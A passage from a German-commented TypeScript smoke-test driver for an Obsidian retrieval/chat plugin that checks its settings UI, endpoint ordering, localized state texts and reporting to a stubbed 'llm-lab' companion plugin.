      // Kommt hier null zurueck, ist die Breite nie angekommen. Die 0 im Detailtext ist dann das
      // Signal „Mutation wirkungslos" — nicht „Hub ist 0 breit" (CORE-TEST-14).
      return r ?? { zeilen: 0, ueberlauf: false, breite: 0 };
    };
    // Der Hub kann vom Nutzer auch links oder im Hauptbereich liegen — dann greift setSize
    // auf den falschen Split und der Punkt maesse Phantome. Lieber ueberspringen als luegen.
    const inRight = await main.evaluate<boolean>(`
      return !!app.workspace.rightSplit?.containerEl?.contains(document.querySelector(".okit-hub-root"));
    `);
    if (!inRight) {
      for (const n of ["Tab-Leiste bricht bei schmaler Sidebar um, statt zu stauchen", "Kein Tab rutscht aus der Leiste heraus"] as const) unmeasured(n, "Hub liegt nicht in der rechten Sidebar");
    } else {
      // Die Breite ist eine Einstellung des Nutzers — vorher merken, im finally zurueckgeben.
      const userWidth = await main.evaluate<number>(`
        return Math.round(app.workspace.rightSplit.containerEl.getBoundingClientRect().width);
      `);
      // Voraussetzung herstellen (REGISTRY-Falle 11): eine EINGEKLAPPTE Sidebar ignoriert
      // `setSize` — der Hub blieb 24 px breit, beide Breiten meldeten 2 Zeilen, der Punkt war
      // rot ohne Befund (frisches Profil, 2026-09-03). Vorher ausklappen, nachher zurueck.
      const wasCollapsed = await main.evaluate<boolean>(`
        const rs = app.workspace.rightSplit;
        if (rs.collapsed) { rs.expand(); return true; }
        return false;
      `);
      let wide = { zeilen: 0, ueberlauf: false, breite: 0 }, narrow = { zeilen: 0, ueberlauf: false, breite: 0 };
      try {
        wide = await rowsAfter(WIDE);
        narrow = await rowsAfter(NARROW);
      } finally {
        await main.evaluate(`
          app.workspace.rightSplit.setSize(${userWidth});
          if (${wasCollapsed}) app.workspace.rightSplit.collapse();
          return true;
        `).catch(() => { console.log("  ! Sidebar-Breite konnte nicht zurückgesetzt werden"); });
      }
      // Die GEMESSENE Breite steht mit im Detail: wirkt die Mutation nicht, sieht man es hier,
      // statt einen Layout-Defekt im Plugin zu suchen (CORE-TEST-14).
      record("Tab-Leiste bricht bei schmaler Sidebar um, statt zu stauchen",
        narrow.zeilen > wide.zeilen,
        `${WIDE}px (ist ${wide.breite}px) → ${wide.zeilen} Zeile(n) · ${NARROW}px (ist ${narrow.breite}px) → ${narrow.zeilen} Zeile(n)`);
      record("Kein Tab rutscht aus der Leiste heraus",
        !wide.ueberlauf && !narrow.ueberlauf,
        "kein horizontaler Überlauf bei beiden Breiten");
    }

    // --- 1./2. Einstellungen öffnen, Zeilen lesen ---------------------------
    // Öffnen über das Hauptfenster (dort lebt `app`), lesen im Einstellungs-Fenster
    // (dort lebt das DOM). Seit 1.13 sind das zwei getrennte Targets.
    await openSettings(main);
    settings = await attachTo("settings", port, vault);
    if (!settings) throw new Error(`Kein Einstellungen-Fenster auf Port ${port} gefunden — hat sich die Seite geöffnet?`);
    await settings.send("Page.bringToFront");
    // Hilfe-Zeile (UI-STANDARD §8): erste gezeichnete Zeile im Tab, mit Text-Knopf und bug-Icon.
    // Geklickt wird nicht — ein Klick oeffnet den System-Browser; die URLs prueft der Unit-Test.
    const hilfe = await settings.evaluate<{ name: string; knopf: boolean; bug: boolean } | null>(`
      const c = document.querySelector(".vertical-tab-content");
      const z = c && c.querySelector(".setting-item");
      if (!z) return null;
      const n = z.querySelector(".setting-item-name");
      return { name: n ? n.textContent : "", knopf: Boolean(z.querySelector("button")), bug: Boolean(z.querySelector(".clickable-icon")) };
    `);
    record("Hilfe-Zeile ist die erste Zeile im Einstellungs-Tab",
      hilfe !== null && /^(Help|Hilfe)$/.test(hilfe.name) && hilfe.knopf && hilfe.bug,
      JSON.stringify(hilfe));
    const shotDir = process.env.SMOKE_SHOT_DIR;
    if (shotDir) writeFileSync(`${shotDir}/hilfe-zeile.png`, await capture(settings));
    // Auf abgeschlossene Proben warten: ein toter Endpunkt läuft in einen 5-s-Timeout,
    // ein zu früher Blick liest „prüfe…" und meldet einen Fehler, der keiner ist.
    const readRowsSettled = async (): Promise<Row[]> => {
      const deadline = Date.now() + 20_000;
      let last: Row[] = [];
      for (;;) {
        last = await settings!.evaluate<Row[]>(READ_ROWS);
        const pending = last.filter(r => isChecking(r.state)).length;
        if (pending === 0 || Date.now() > deadline) return last;
        await new Promise(r => setTimeout(r, 750));
      }
    };
    const rows = await readRowsSettled();
    record("Endpunkt-Zeilen gefunden", rows.length > 0, `${rows.length} Zeilen`);
    if (rows.length === 0) throw new Error("Keine .okit-ep-row im DOM — falscher Tab?");

    const listNames = ["Embedding", "Chat"];
    console.log("\n  Zeilen wie gerendert:");
    for (const r of rows) {
      const list = listNames[r.listIndex] ?? `Liste ${r.listIndex}`;
      console.log(`    [${list}] ${r.url || "(leer/Adder)"} → ${r.state === null ? "(keine Zustandszeile)" : `"${r.state}"`} · ${r.buttonCount} Knöpfe`);
    }
    console.log("");

    const withState = rows.filter(r => r.state !== null);
    const lists = [...new Set(withState.map(r => r.listIndex))];

    // --- 3. Knopf-Verteilung (in der Liste mit den meisten Zeilen) -----------
    // Die Chat-Liste ist die zweite gerenderte Gruppe. Sie trägt den Klick-Test, weil
    // nur für sie die Reihenfolge gesichert und zurückgeschrieben wird (savedChatOrder).
    const CHAT_LIST = 1;
    const chatRows = withState.filter(r => r.listIndex === CHAT_LIST);
    const testRows = chatRows.length >= 2
      ? chatRows
      : (lists.map(li => withState.filter(r => r.listIndex === li)).sort((a, b) => b.length - a.length)[0] ?? []);
    const inChatList = testRows === chatRows;
    const first = testRows[0];
    const second = testRows[1];
    // Gezielt nach dem Icon suchen statt Knöpfe zu zählen: die Zeile trägt je nach
    // Ladezustand zusätzlich einen „Modelle abrufen"-Knopf, eine Anzahl sagt also nichts.
    record(
      "Zeile 1 trägt keinen Prioritäts-Knopf",
      first ? !first.hasPriorityButton : false,
      first ? (first.hasPriorityButton ? "Knopf vorhanden — die i>0-Bedingung greift nicht" : "korrekt ohne") : "keine Zeile mit Zustand",
    );
    if (second) {
      record(
        "Zeile 2 trägt den Prioritäts-Knopf",
        second.hasPriorityButton,
        second.hasPriorityButton ? `Icon: ${second.priorityIconClass}` : `nicht gefunden · Icons: ${second.buttonIcons.join(", ")}`,
      );
      // Der Prüfpunkt, der statisch nicht zu klären war: Obsidian bündelt Lucide, ohne die
      // Namen zu exportieren, und `setIcon` rendert einen unbekannten Namen kommentarlos
      // als NICHTS — ein unsichtbarer, aber klickbarer Knopf. Gemessen wird deshalb das
      // gerenderte SVG, nicht eine API-Auskunft über den Namen: nur das Ergebnis zählt.
      const iconOk = (second.priorityIconClass ?? "").includes(PRIORITY_ICON);
      record(
        `Icon "${PRIORITY_ICON}" rendert tatsächlich ein SVG`,
        iconOk,
        iconOk
          ? (second.priorityIconClass ?? "")
          : `KEIN SVG — Obsidians Lucide kennt den Namen nicht. Auf "${FALLBACK_ICON}" wechseln (setIcon in buildEndpointList).`,
      );
    } else {
      // Kein ✗: mit nur einer Zeile gibt es nichts zu messen. Bis 2026-09-03 zaehlte das als
      // Fehlschlag und hielt jede Bilanz im Arbeitsvault dauerhaft rot — der Staging-Vault traegt
      // deshalb zwei Zeilen je Liste (docs/images/fixture/plugin/settings.json).
      unmeasured("Zeile 2 trägt den Prioritäts-Knopf", "nur eine Endpunkt-Zeile konfiguriert — nicht prüfbar");
      unmeasured(`Icon "${PRIORITY_ICON}" rendert tatsächlich ein SVG`, "braucht eine zweite Endpunkt-Zeile");
    }

    // --- 4. Zustandstexte ---------------------------------------------------
    // PRO LISTE prüfen: Embedding und Chat haben je einen aktiven Endpunkt. Global gezählt
    // wären zwei „aktiv" ein Fehlalarm.
    for (const li of lists) {
      const inList = withState.filter(r => r.listIndex === li);
      const V = li === CHAT_LIST ? LK : L;
      const activeRows = inList.filter(r => r.state === V.active);
      const reachable = inList.filter(r => r.state !== V.unreachable && r.state !== V.checking);
      const name = listNames[li] ?? `Liste ${li}`;
      // Ist gar nichts erreichbar, ist „keine aktive Zeile" die ehrliche Anzeige, kein Fehler.
      const expected = reachable.length === 0 ? 0 : 1;
      record(
        `${name}: genau eine Zeile als aktiv markiert (keine, wenn nichts erreichbar ist)`,
        activeRows.length === expected,
        activeRows.length === 1 ? `„${activeRows[0].url}"` : `${activeRows.length} aktive Zeilen von ${inList.length}`,
      );
    }
    // Die erwarteten Zustandstexte kommen aus DEM Woerterbuch, das die Oberflaeche gerade
    // benutzt — nicht aus fest verdrahtetem Deutsch. Vorher pruefte der Treiber hart gegen
    // „aktiv"/„nicht erreichbar" und wurde auf einer englisch gestellten Instanz dreimal rot,
    // ohne dass am Produkt etwas fehlte (gemessen von der llm-lab-Session am 2026-08-30: 25/30
    // statt 27/30). Bemerkenswert daran: dieses Repo hat vier i18n-Waechter fuer den
    // Produktcode — nur der PRUEFSTAND wurde nie gegen dieselbe Regel gehalten.
    const escape = (x: string) => x.replace(/[.*+?^${}()|[\]\\]/g, "\\$&");
    const regexOf = (V: typeof L): RegExp => new RegExp("^(" + [
      escape(V.active),
      escape(V.standby).replace("\\{0\\}", "\\d+"),
      escape(V.unreachable),
      escape(V.skippedModel),
      escape(V.checking),
    ].join("|") + ")$");
    const zustandsRegex = { embedding: regexOf(L), chat: regexOf(LK) };
    const unknown = withState.filter(r => !(r.listIndex === CHAT_LIST ? zustandsRegex.chat : zustandsRegex.embedding).test(r.state ?? ""));
    record("Alle Zustandstexte sind bekannte Formulierungen", unknown.length === 0,
      unknown.length ? unknown.map(r => `"${r.state}"`).join(", ") : `${withState.length} Zeilen geprüft`);
    const stillProbing = withState.filter(r => isChecking(r.state));
    record("Alle Proben abgeschlossen", stillProbing.length === 0,
      stillProbing.length ? `${stillProbing.length} Zeilen noch bei „${L.checking}" — Timeout zu kurz?` : `${withState.length} Zeilen abgeschlossen`);

    // --- 5. Layout ----------------------------------------------------------
    const layoutRow = withState.find(r => r.stateWidthRatio !== null);
    record(
      "Zustandszeile bricht auf volle Breite um",
      layoutRow ? (layoutRow.stateWidthRatio ?? 0) >= 95 : false,
      layoutRow ? `${layoutRow.stateWidthRatio}% der Zeilenbreite` : "nicht messbar",
    );
    record(
      "Zustandszeile steht unter den Feldern",
      layoutRow ? layoutRow.stateTopBelowFields === true : false,
      layoutRow ? String(layoutRow.stateTopBelowFields) : "nicht messbar",
    );
    const withWarn = withState.filter(r => r.warnIconBelowState !== null);
    if (withWarn.length) {
      const misplaced = withWarn.filter(r => r.warnIconBelowState === true);
      record(
        "Warn-/Schlüssel-Icons bleiben in der Feldzeile",
        misplaced.length === 0,
        misplaced.length ? `${misplaced.length} Zeile(n) mit Icon unter dem Text (order-Fix wirkt nicht)` : `${withWarn.length} Zeile(n) geprüft`,
      );    } else {
      // Der Gegenstand fehlt: keine Zeile trägt ein Warn- oder Schlüssel-Icon (die Fixture-Zeilen tragen weder Schlüssel noch
      // Warnung). Der alte Treiber ließ den Punkt dann still weg; er gehört als „nichts gemessen“ in die Bilanz.
      unmeasured("Warn-/Schlüssel-Icons bleiben in der Feldzeile", "keine Zeile mit Warn- oder Schlüssel-Icon in dieser Konfiguration (die Fixture hat keinen Schlüssel)");
    }

    // --- 6. Klick: zuerst verwenden -----------------------------------------
    if (second && second.hasPriorityButton && inChatList) {
      savedChatOrder = await main.evaluate<string[]>(`
        return app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}].settings.chatEndpoints.map(e => e.url);
      `);
      const beforeUrl = second.url;
      // Die Zeile über ihre URL treffen, nicht über den Index: die Adder-Zeilen und die
      // zweite Liste verschieben jede Index-Rechnung.
      await settings.evaluate(`
        const wanted = ${JSON.stringify(beforeUrl)};
        // Dieselbe Listenzuordnung wie READ_ROWS (Eltern-Container in Reihenfolge des ersten
        // Auftretens): dieselbe URL steht im Fixture in Embedding- UND Chat-Liste, die erste
        // Treffer-Zeile war die Embedding-Zeile ohne Prioritäts-Knopf (Welle 14).
        const parents = [];
        const rows = [...document.querySelectorAll(".okit-ep-row")].filter(r => {
          const p = r.parentElement;
          let idx = parents.indexOf(p);
          if (idx === -1) { parents.push(p); idx = parents.length - 1; }
          return idx === ${second.listIndex};
        });
        const target = rows.find(r => {
          const input = r.querySelector('input[type="text"]');
          return input && input.value === wanted;
        });
        if (!target) throw new Error("Zeile nicht mehr gefunden: " + wanted);
        const svg = target.querySelector('svg[class*="arrow-up-to-line"], svg[class*="chevrons-up"]');
        if (!svg) throw new Error("Kein Prioritäts-Knopf in der Zeile");
        svg.closest("div").click();
      `);
      // Auf die tatsächliche Umordnung warten, nicht auf eine Pauschalfrist: der Klick
      // löst reconnect() aus, das jeden konfigurierten Endpunkt pingt — drei tote Einträge
      // sind bis zu 15 s. Wer vorher liest, sieht das ALTE DOM und hält den Klick für
      // wirkungslos (genau dieser Fehlalarm, 2026-08-05).
      const after = await (async (): Promise<Row[]> => {
        const deadline = Date.now() + 30_000;
        let last: Row[] = [];
        for (;;) {
          last = await readRowsSettled();
          const inList = last.filter(r => r.listIndex === second.listIndex && r.state !== null);
          if (inList[0]?.url === beforeUrl || Date.now() > deadline) return last;
          await new Promise(r => setTimeout(r, 750));
        }
      })();
      const afterInList = after.filter(r => r.listIndex === second.listIndex && r.state !== null);
      const top = afterInList[0];
      const movedToTop = top?.url === beforeUrl;
      record("Klick setzt die Zeile an die Spitze", movedToTop,
        movedToTop ? `„${beforeUrl}" steht auf Platz 1` : `Platz 1 ist „${top?.url}"`);
      record("Die nach oben geholte Zeile meldet danach ihren Zustand",
        !!top && top.state !== null && !isChecking(top.state),
        `„${top?.state}"`);
      record("Die nach oben geholte Zeile trägt keinen Prioritäts-Knopf mehr",
        !!top && !top.hasPriorityButton,
        top?.hasPriorityButton ? "Knopf noch da" : "korrekt entfernt");
    } else {
      const grund = inChatList ? "kein zweiter Chat-Endpunkt mit Knopf" : "Chat-Liste hat weniger als zwei Einträge";
      unmeasured("Klick setzt die Zeile an die Spitze", grund);
      unmeasured("Die nach oben geholte Zeile meldet danach ihren Zustand", grund);
      unmeasured("Die nach oben geholte Zeile trägt keinen Prioritäts-Knopf mehr", grund);
    }

    // --- 7. Rolle folgt dem Zeilen-Modell -----------------------------------
    // Regressionsschutz für eine Fehlerklasse, die zweimal auftrat: die Zustandszeile ist
    // ein Schnappschuss. Ein Modell-Commit ändert die Rolle (`skipped-model`), löst aber
    // bewusst kein Neuzeichnen aus — ohne Nachziehen behauptet die Zeile weiter, der
    // Endpunkt stünde nur hinten an, während der Guard ihn längst überspringt. Seit jede
    // Zeile ihr Modell traegt (kein globalModel/allowEmpty mehr, siehe endpoint-list),
    // wird nicht mehr ein Override entfernt, sondern auf ein ANDERES gelistetes Modell
    // gewechselt — dieselbe Bauart, nur ohne die inzwischen nicht mehr existierende
    // Leer-Option im Dropdown.
    const modelRow = withState.find(r => r.listIndex === 0 && r.modelValue);
    if (modelRow) {
      const original = modelRow.modelValue as string;
      const rowIndex = modelRow.index;
      const options = await settings!.evaluate<string[]>(`
        const row = [...document.querySelectorAll(".okit-ep-row")][${rowIndex}];
        const sel = row.querySelector("select");
        return sel ? [...sel.options].map(o => o.value) : [];
      `);
      const other = options.find(v => v && v !== original);
      if (other === undefined) {
        unmeasured("Rolle folgt dem Zeilen-Modell ohne Tab-Neuaufbau", "Endpunkt listet nur ein Modell — kein Wechsel möglich");
      } else {
        const setModel = async (value: string): Promise<string | null> => {
          await settings!.evaluate(`
            const row = [...document.querySelectorAll(".okit-ep-row")][${rowIndex}];
            const sel = row.querySelector("select");
            if (!sel) throw new Error("Kein Modell-Dropdown in der Zeile");
            sel.value = ${JSON.stringify("__V__")};
            sel.dispatchEvent(new Event("change"));
            await new Promise(r => setTimeout(r, 4000));
          `.replace("__V__", value));
          const rows2 = await readRowsSettled();
          return rows2[rowIndex]?.state ?? null;
        };
        let withOther: string | null = null;
        let withOriginal: string | null = null;
        try {
          withOther = await setModel(other);
          withOriginal = await setModel(original);
        } finally {
          // Zeile IMMER auf das Original zurückstellen, auch wenn ein setModel oben wirft —
          // sonst hinterlässt ein fehlgeschlagener Lauf einen fremden Modellnamen in der
          // Konfiguration des Nutzers.
          const rows3 = await readRowsSettled();
          if (rows3[rowIndex]?.modelValue !== original) await setModel(original);
        }
        record(
          "Rolle folgt dem Zeilen-Modell ohne Tab-Neuaufbau",
          // Gegen das Woerterbuch der LAUFENDEN Oberflaeche, nicht gegen festes Deutsch — dieselbe
          // Fehlerklasse wie der Sprachbefund vom 2026-08-30 (drei falsch-rote Zustandstexte).
          withOther === L.skippedModel && withOriginal !== L.skippedModel,
          `mit fremdem Modell „${withOther}" · zurück „${withOriginal}"`,
        );
      }
    } else {
      unmeasured("Rolle folgt dem Zeilen-Modell ohne Tab-Neuaufbau", "kein Embedding-Endpunkt mit Modell konfiguriert");
    }

    // --- 7b. llm-lab-Meldestrecke (KONSUMENTEN-Seite) -----------------------
    // Spiegelbild zu `llm-lab/scripts/gui-smoke.ts`: dort spielt der Treiber den Konsumenten,
    // um den Anbieter zu pruefen. Hier haengt er ein Lab-Stub ein und prueft, was vault-rag
    // tatsaechlich sendet — genau die Haelfte, die uns gehoert. Ob das echte Lab die Zeile
    // dann speichert, filtert oder verwirft, ist dessen Zusage und dessen Smoke.
    //
    // Warum ein Stub und kein installiertes Lab: die Zusage lautet "wir rufen readLabApi(app)
    // ?.log(...) mit diesen Feldern". Ein installiertes Lab wuerde diese Zusage nicht schaerfer
    // pruefen, aber den Lauf an eine fremde Installation binden — und CORE-TEST-02 (b) verlangt
    // die Verdrahtung getrackt im Repo, das sie besitzt.
    //
    // Ist ein ECHTES Lab installiert, wird nichts eingehaengt: der Smoke darf dessen
    // Aufzeichnung nicht mit Testzeilen verunreinigen.
    //
    // Ein Objekt an diesem Slot ist aber NICHT automatisch ein echtes Lab — ein per Ctrl-C
    // abgebrochener vorheriger Lauf laesst genau hier den eigenen Stub stehen (der
    // Abbruch-Modul der Bruecke (`zustand`) faengt das fuer NEUE Abbrueche ab, ein Rest aus der Zeit VOR
    // dem Modul bzw. aus einem SIGKILL bleibt trotzdem moeglich). Ohne Unterscheidung liest
    // `labReal` den eigenen Stub als "echtes Lab installiert" und ueberspringt seinen ganzen
    // Zweig — still, ~15 Pruefpunkte (Dach-Task „Kein GUI-Smoke-Treiber raeumt bei Ctrl-C auf").
    // Der Marker `__vaultRagSmokeStub` (gesetzt beim Einhaengen weiter unten) macht das laut.
    const labInfo = await main.evaluate<{ present: boolean; ownStub: boolean }>(`
      const p = app.plugins.plugins["llm-lab"];
      return { present: !!p, ownStub: !!(p && p.__vaultRagSmokeStub) };
    `);
    const leftoverStub = labInfo.present && labInfo.ownStub;
    record("Kein liegen gebliebener llm-lab-Stub aus einem abgebrochenen Lauf",
      !leftoverStub,
      leftoverStub
        ? "eigener Stub im Renderer gefunden und entfernt — vermutlich Ctrl-C/Crash im vorigen Lauf vor dessen Aufraeumen; dieser Lauf faehrt normal weiter"
        : "kein Stub-Rest im Renderer");
    if (leftoverStub) {
      await main.evaluate(`
        delete app.plugins.plugins["llm-lab"];
        delete window.__vaultRagLabSeen;
        delete window.__vaultRagLabBaseline;
      `);
    }
    const labReal = leftoverStub ? false : labInfo.present;
    if (labReal) {
      // EIN Skip-Eintrag je nicht gelaufenem Pruefpunkt, nicht einer fuer den Block: die Bilanz soll
      // sagen, wie viele Punkte fehlen, nicht wie viele Abschnitte. Am 2026-09-02 verbarg genau
      // diese Zeile 15 von 40 Punkten hinter einem einzigen Gedankenstrich.
      const grund = "echtes llm-lab installiert — der Smoke hängt kein Stub ein, um dessen Aufzeichnung nicht zu verfälschen; im Staging-Vault (ohne llm-lab) fahren";
      for (const name of LAB_PRUEFPUNKTE) unmeasured(name, grund);
    } else {
      // Den Chat-Endpunkt AUFWAERMEN, bevor ein Pruefpunkt an seiner Antwort haengt: LM Studio
      // laedt das Modell erst beim ersten Request (JIT) und entlaedt es nach Leerlauf wieder;
      // bei 27B dauert das laenger als die 180-s-Frist des Chat-Punkts — der meldete „Antwort
      // blieb aus", waehrend der ZWEITE Chat desselben Laufs in Sekunden kam (2026-09-03).
      // Ladezeit ist Umgebung, kein Befund; sie gehoert deshalb vor den Punkt und ins Protokoll.
      // Auf der NODE-Seite, nicht im Renderer: von dort scheitert `fetch` am CORS-Preflight
      // (LM Studio ohne `--cors`; das Plugin selbst geht ueber `requestUrl`/XHR, die kein CORS
      // kennen), der erste Anlauf meldete „Failed to fetch" nach 2 s und waermte nichts.
      // Den Endpunkt nehmen, den das Plugin WIRKLICH benutzt (`llm.resolve()`), nicht
      // `chatEndpoints[0]`: der Klick-Pruefpunkt weiter oben hat die Liste umsortiert (den toten
      // Endpunkt an Platz 1), und zurueckgeschrieben wird erst im finally — der Warmup traf so
      // zweimal ECONNREFUSED, waehrend der Chat danach ueber den aktiven Endpunkt lief.
      const warmEp = await main.evaluate<{ url: string; model: string; apiKey?: string } | null>(`
        const p = app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}];
        const used = (await p.llm.resolve()).config;
        // chatEndpoints[0] traegt seit dem Schluesselbund keinen apiKey mehr: der Schluessel kommt aus der Aufloesung.
        const ep = (used && used.url) ? used : (p.settings.chatEndpoints || [])[0];
        return ep ? { url: ep.url, model: ep.model || "", apiKey: ep.apiKey } : null;
      `);
      const warmStart = Date.now();
      let warm = "kein Chat-Endpunkt konfiguriert";
      if (warmEp) {
        const headers: Record<string, string> = { "Content-Type": "application/json" };
        if (warmEp.apiKey) headers["Authorization"] = `Bearer ${warmEp.apiKey}`;
        try {
          const r = await fetch(`${warmEp.url.replace(/\/+$/, "")}/v1/chat/completions`, {
            method: "POST", headers, signal: AbortSignal.timeout(300_000),
            body: JSON.stringify({ model: warmEp.model, max_tokens: 1, messages: [{ role: "user", content: "ok" }] }),
          });
          warm = `HTTP ${r.status}`;
        } catch (e) {
          // `fetch failed` allein sagt nichts — der Grund steckt in `cause` (undici).
          const c = (e as { cause?: { code?: string; message?: string } }).cause;
          const cause = c ? ` (${c.code ?? c.message ?? "?"})` : "";
          warm = `Fehler: ${e instanceof Error ? e.message : String(e)}${cause}`;
        }
      }
      console.log(`  (Chat-Endpunkt aufgewärmt: ${warm} nach ${Math.round((Date.now() - warmStart) / 1000)} s)`);

      const clientLabVersion = readConstant(CLIENT_LAB_FILE, "LAB_API_VERSION");
      if (clientLabVersion === null) throw new Error("LAB_API_VERSION nicht in src/vendor/kit-obsidian/lab-client.ts gefunden — der Stub braucht sie");
      labStubbed = true;   // fuers finally
      // Herkunft der apiVersion: der Stub liest sie aus dem vendorten Kit-Client `src/vendor/kit-obsidian/lab-client.ts` (LAB_API_VERSION; seit Welle 11 — davor `src/lab_client.ts`),
      // trägt also KEINE eigene Kopie mehr. Damit ist er per Bauart so alt wie der Client und kann
      // einen Bump nicht sehen — das leistet der Punkt „Der Lab-Client spricht dieselbe apiVersion
      // wie das echte llm-lab", der llm-labs Konstante aus dessen Quelltext gegenliest.
      // (Bis 2026-09-25 stand hier eine handgepflegte Zahl; der Rest dieses Absatzes ist die
      // Vorgeschichte.) Die apiVersion war eine VERTRAGSKOPIE — genau wie `lab_client.ts`s eigene
      // SUPPORTED_API_VERSION traegt sie den Stand von llm-labs LLM_LAB_API_VERSION
      // (src/plugin_api.ts) manuell nach und muss bei jedem Bump dort mitziehen. Aktueller
      // Stand: 4 (seit dem Bump vom 2026-09-03, hier nachgezogen 2026-09-25 — bis dahin
      // stand hier 3, und weil Stub und Client dieselbe Zahl trugen, lief der Punkt grün,
      // waehrend das echte llm-lab (4) den Client ausgesperrt haette). Vorher 3 (2026-08-30), 2 (431c23c).
      // Ein veralteter Wert hier faellt `readLabApi()`s strikten Vergleich
      // durch und laesst den Stub aussehen, als waere kein llm-lab installiert.
      await main.evaluate(`
        window.__vaultRagLabSeen = [];
        app.plugins.plugins["llm-lab"] = {
          __vaultRagSmokeStub: true,
          api: {
            apiVersion: ${clientLabVersion},
            status: () => ({ apiVersion: ${clientLabVersion}, recording: true }),
            log: (input) => { window.__vaultRagLabSeen.push(input); return "smoke-" + window.__vaultRagLabSeen.length; },
          },
        };
      `);

      // (1) Chat ueber die OBERFLAECHE — nicht ueber Plugin-Interna: der Punkt ist, dass der
      // trace-Parameter den ganzen Weg Panel → ChatSession → ChatClient uebersteht.
      // ⚠️ Tippen und Senden sind ZWEI Schritte, und das ist der ganze Punkt.
      // `scheduleQuery` entprellt die Eingabe 400 ms, bevor das Kontext-Panel embedded und
      // sucht; `submit()` raeumt genau diesen Timer ab (chat_view.ts). Wer Text setzt und
      // sofort klickt, sendet also garantiert mit LEEREM Kontext — ein Zustand, den ein
      // Benutzer nie erzeugt, weil Tippen dauert. Der Treiber mass damit bis 2026-09-06 die
      // `contextPaths`-Haelfte unserer Lab-Zusage nie (aufgefallen im llm-lab-Lauf am
      // 2026-08-24, dort belegt — aber dort gehoert sie nicht hin, es ist unsere Zusage).
      //
      // Die Frage traegt deshalb zweierlei: Fachbegriffe, die im Fixture wirklich vorkommen
      // ("Semantic search", "Vector embeddings", "Cosine similarity" sind eigene Notizen),
      // damit die semantische Suche ueberhaupt Treffer hat — und die Ein-Wort-Auflage, damit
      // der Punkt nicht an der Antwortlaenge haengt.
      await main.evaluate(`
        await app.commands.executeCommandById("vault-retrieval:open-vault-chat");
        await new Promise(r => setTimeout(r, 800));
        const ta = document.querySelector(".vault-rag-chat-input");
        ta.value = "Answer with exactly one word. Which note of mine covers vector embeddings and cosine similarity?";
        ta.dispatchEvent(new Event("input", { bubbles: true }));
      `);
      // Auf die Chips warten statt auf eine feste Frist: das Embedden der Frage geht ueber den
      // Endpunkt, und dessen Dauer ist Umgebung. 30 s reichen fuer einen lokalen Embedder mit
      // Abstand; laeuft keiner, bleibt die Liste leer und der Punkt sagt genau das.
      const chipsDa = await pollUntil(main,
        `return document.querySelectorAll(".vault-rag-ctx-chip").length > 0;`,
        30_000, 500).catch(() => false);
      // Basenames, nicht Pfade: die Chips zeigen `basename(p)` (context_panel.ts), der Trace
      // traegt volle Pfade. Der Vergleich laeuft deshalb ueber die Namen — Pinned-Chips tragen
      // zusaetzlich ein 📌, alle ein ✕ zum Entfernen.
      const panelChips = await main.evaluate<string[]>(`
        return [...document.querySelectorAll(".vault-rag-ctx-chip")]
          .map(c => (c.textContent || "").replace(/^\s*📌\s*/, "").replace(/\s*✕\s*$/, "").trim())
          .filter(Boolean);
      `);
      // ERST JETZT senden — mit gefuelltem Panel.
      await main.evaluate(`document.querySelector(".vault-rag-chat-send").click();`);
      // Auf das ERGEBNIS warten, nie auf den Sende-Knopf: der durchlaeuft im selben Turn
      // mehrere Uebergaenge (Senden→Stop→Senden) und meldet zu frueh "fertig"
      // (_docs/LESSONS.md 2026-08-23, n=2). Die Ergebniszeile stellt nur ein fertiger Lauf her.
      const chatDone = await pollUntil(main,
        `const w = document.querySelector(".vault-rag-chat-working"); return !!w && /✓/.test(w.textContent || "");`,
        CHAT_FRIST_MS, 1_000).catch(() => false);
      const chatTrace = await main.evaluate<{ n: number; last: Record<string, unknown> | null }>(`
        const seen = window.__vaultRagLabSeen;
        return { n: seen.length, last: seen.length ? seen[seen.length - 1] : null };
      `);
      const ct = chatTrace.last as { plugin?: string; feature?: string; ttftMs?: number; model?: string; latencyMs?: number } | null;
      record("Ein Chat über die Oberfläche meldet sich beim Lab",
        chatDone === true && ct?.plugin === "vault-retrieval" && ct?.feature === "chat",
        chatDone ? `plugin=${String(ct?.plugin)} · feature=${String(ct?.feature)} · model=${String(ct?.model)}` : `keine Ergebniszeile in ${CHAT_FRIST_MS / 1000} s — Warmup sagte „${warm}"; denkendes Modell ohne suppressThinking?`);
      // ttftMs trennt "Modell dachte lange" von "Verbindung stand nicht" — ohne den Wert ist
      // eine langsame Antwort in der Aufzeichnung nicht diagnostizierbar.
      record("Die Chat-Zeile trägt ttftMs und latencyMs",
        typeof ct?.ttftMs === "number" && typeof ct?.latencyMs === "number" && (ct.ttftMs ?? 0) <= (ct.latencyMs ?? 0),
        `ttftMs=${String(ct?.ttftMs)} · latencyMs=${String(ct?.latencyMs)}`);

      // apiVersion 4: eine Nutzer-Handlung, eine turnId. Der Chat ist hier genau eine Handlung.
      const turnIdChat = (chatTrace.last as { turnId?: unknown } | null)?.turnId;
      record("Die Chat-Zeile trägt eine turnId (apiVersion 4)",
        typeof turnIdChat === "string" && turnIdChat.length > 0, `turnId=${String(turnIdChat)}`);

      // Stub und Client sind gleich alt (der Stub liest die Version aus dem Client). Ob der Client
      // noch zum ECHTEN llm-lab passt, sagt nur dessen Quelltext — fehlt er, ist das „nichts
      // gemessen", nicht grün.
      const realLabVersion = readConstant(REAL_LAB_FILE, "LLM_LAB_API_VERSION");
      if (realLabVersion === null) {
        unmeasured("Der Lab-Client spricht dieselbe apiVersion wie das echte llm-lab",
          "llm-lab-Quelltext nicht gefunden (../llm-lab/src/plugin_api.ts) — nichts gemessen");
      } else {
        record("Der Lab-Client spricht dieselbe apiVersion wie das echte llm-lab",
          realLabVersion === clientLabVersion, `Client ${clientLabVersion} · llm-lab ${realLabVersion}`);
      }

      // Die zweite Haelfte der Lab-Zusage: WAS als Kontext mitging, nicht nur DASS gemeldet wurde.
      // Verglichen wird gegen das, was der Nutzer SIEHT (die Chips), nicht gegen eine zweite
      // Abfrage derselben Quelle — sonst prueft der Punkt die Funktion gegen sich selbst.
      // Bleiben die Chips aus, ist die naechste Frage immer dieselbe: Index oder Endpunkt?
      // Einmal nachsehen ist billiger, als den Lauf mit „keine Chips" zu beenden und raten zu
      // lassen — und `status()` ist synchron und netzfrei, kostet also nichts am Ergebnis.
      const ctxDiagnose = chipsDa ? "" : await main.evaluate<string>(`
        const api = app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}]?.api;
        const st = api ? api.status() : null;
        if (!st) return "Plugin-API nicht erreichbar";
